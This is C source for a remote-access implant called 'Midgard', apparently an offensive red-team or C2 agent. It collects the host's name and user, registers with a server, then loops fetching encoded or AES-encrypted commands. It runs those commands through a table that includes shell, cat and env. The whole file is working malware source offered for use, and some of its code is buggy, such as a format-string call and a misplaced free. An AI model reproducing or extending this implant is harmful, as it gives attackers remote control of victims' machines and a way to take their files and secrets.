#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <liburing.h>
#include <time.h>
#include "agent_functions/command_header.h"
#include "agent_functions/function_header.h"
#include "cjson/cJSON.h"

// Constants
#define QUEUE_DEPTH 2 // Small because I only need it for hostname

unsigned int sleep_int = 10;

void sanitize_cmd(char *cmd) {
    size_t len = strlen(cmd);
    while (len > 0 && (cmd[len - 1] == '\n' || cmd[len - 1] == '\r' || cmd[len - 1] == ' ' || cmd[len - 1] == '\t'))
        cmd[--len] = '\0';
}

// Hash map to find functions and execute them
#define TABLE_SIZE 20
#define CMD_LEN 64

typedef void (*func_ptr)(request_t *req, int sockfd, const profile_t *profile, const char *args); // function pointer

typedef struct {
    char command[CMD_LEN];
    func_ptr func;
} check;

check *hash_table[TABLE_SIZE];

unsigned int hash(char *name) { // hashing function for hash table
    unsigned long hash = 5381;
    int c;

    while ((c = *name++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash % TABLE_SIZE;
}

check function[] = { // table of command names and function pointers
    {"ls", cmd_ls},
    {"cat", cmd_cat},
    {"env", cmd_env},
    {"shell", cmd_shell},
    {"cd", cmd_cd},
    {"NULL", NULL}};

bool hash_insert() { // Creates the hash table
    for (int i = 0; function[i].func != NULL; i++) {
        int index = hash(function[i].command);
        if (hash_table[index] != NULL) {
            printf("ERROR: Hash Table Insert Collision!!");
            return false;
        }
        else {
            hash_table[index] = &function[i];
        }
    }
    return true;
}

void command_execute(request_t *req, int sockfd, profile_t *profile, char *command, char *args) {

    profile->method = "POST";
    if (strcmp(command, "sleep") == 0) {
        sleep_int = atoi(args);
        send2serv(req, profile, "Done\n", 6);
    }
    else {
        char lookup_key[CMD_LEN];
        snprintf(lookup_key, sizeof(lookup_key), command);
        int index = hash(lookup_key);
        if (hash_table[index] != NULL && strcmp(hash_table[index]->command, lookup_key) == 0) {
            hash_table[index]->func(req, sockfd, profile, args);
        }
        else {
            char msg[256];
            snprintf(msg, sizeof(msg), "Invalid command or Something went wrong! (%s %s) How did you do this??\n", command, args ? args : "NULL");
            send2serv(req, profile, msg, strlen(msg));
        }
    }
}

int main() {

    // Create UUID
    srand(time(NULL));
    const char charset[] = "abcdef1234567890";
    const char y[] = "89ab";
    int charset_len = strlen(charset);
    int y_len = strlen(y);

    int uuid_len = 36 + 1;
    char tmp_uuid[uuid_len + 1];
    for (int i = 0; i < uuid_len; i++) {
        if (i == 8 || i == 13 || i == 18 || i == 23) {
            tmp_uuid[i] = '-';
        } else if (i == 14) {
            tmp_uuid[i] = '4';
        } else if (i == 19) {
            int uuid_index = rand() % y_len;
            tmp_uuid[i] = y[uuid_index];
        } else {
            int uuid_index = rand() % charset_len;
            tmp_uuid[i] = charset[uuid_index];
        }
        
    }
    tmp_uuid[uuid_len] = '\0';
    char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));

    struct io_uring ring;
    hash_insert(); // Create hash table

    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
        perror("io_uring_queue_init");
        return 1;
    }

    char *host = read_file(&ring, "/proc/sys/kernel/hostname"); // Get system hostname
    sanitize_cmd(host);
    io_uring_queue_exit(&ring);
    char *tmp_user = getenv("USER");

    if (tmp_user == NULL) {
        tmp_user = "Unknown";
    }
    char *user = base64_encode((const unsigned char *)tmp_user, strlen(tmp_user));

    // Profile Config
    profile_t *profile = malloc(sizeof(profile_t));
    profile->hostname = host;
    profile->user = user;
    profile->uuid = uuid;
    profile->path = "/v3/api/register";  // Register endpoint
    profile->agent = "Midgard";
    profile->compile_id = strdup("bf86d08b-e2f4-4bc1-878e-2c71635efaea");
    profile->reg = (int *)1;
    profile->aes = (int *)0;

    // First run (no processing)
    request_t *req = calloc(1, sizeof(request_t));
    profile->method = "POST";
    char *http_body = send2serv(req, profile, profile->compile_id, strlen(profile->compile_id));
    cJSON *response_json = cJSON_Parse(http_body);
    const cJSON *key = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
    const cJSON *iv = cJSON_GetObjectItemCaseSensitive(response_json, "param");
    if (profile->aes == (int *)1) {
        size_t outlen;
        profile->key = (char *)base64_decode(key->valuestring, strlen(key->valuestring), &outlen, 1);
        profile->iv = (char *)base64_decode(iv->valuestring, strlen(iv->valuestring), &outlen, 1);
    }
    cJSON_Delete(response_json);
    cleanup_connection(req);

    // Prepare profile config for callbacks
    
    profile->path = "/v3/api/login";
    profile->reg = 0;

    // Clean up variables
    explicit_bzero(tmp_user, strlen(tmp_user));
    explicit_bzero(user, strlen(user));
    explicit_bzero(profile->compile_id, strlen(profile->compile_id));
    free(profile->compile_id);
    profile->compile_id = NULL;
    explicit_bzero(tmp_uuid, sizeof(tmp_uuid));

    free(profile->user);

    sleep(sleep_int);

    char *cmd;
    char *args;
    while (true) {
        request_t *req = calloc(1, sizeof(request_t));

        profile->method = "GET";
        char *http_body = send2serv(req, profile, "", 0);
        cJSON *response_json = cJSON_Parse(http_body);
        const cJSON *command = cJSON_GetObjectItemCaseSensitive(response_json, "data"); // Get JSON data
        const cJSON *param = cJSON_GetObjectItemCaseSensitive(response_json, "param");

        if (response_json == NULL) {
            cJSON_Delete(response_json);
            cleanup_connection(req);
            sleep(sleep_int);
            continue;
        }

        if (profile->aes == 0) {
            size_t size;
            cmd = (char *)base64_decode(command->valuestring, strlen(command->valuestring), &size, 1);
            args = (char *)base64_decode(param->valuestring, strlen(param->valuestring), &size, 1);
        } else {
            cmd = (char *)aes_decrypt(command->valuestring, profile);
            args = (char *)aes_decrypt(param->valuestring, profile);
        }
        
        if (cmd == NULL || args == NULL) {
            profile->method = "POST";
            char *message = "Error: Failed to decrypt command or args from server.\n";
            send2serv(req, profile, message, strlen(message));
            sleep(sleep_int);
            continue;
        }

        if (strcmp(cmd, "") == 0) {
            cJSON_Delete(response_json);
            cleanup_connection(req);
            sleep(sleep_int);
            continue;
        } else if (strcmp(cmd, "exit") == 0) {
            cJSON_Delete(response_json);
            cleanup_connection(req);
            cmd = NULL; // prevent double free
            args = NULL;
            free(cmd);
            free(args);          
            break;
        } else {
            command_execute(req, req->client_socket, profile, cmd, args);
            cJSON_Delete(response_json);
            cleanup_connection(req);
            free(cmd);
            free(args);
            sleep(sleep_int);
        }
    }
    
    free(user);
    free(uuid);
    free(profile->key);
    free(profile->iv);
    free(host);
    free(profile);
    _exit(0);
}
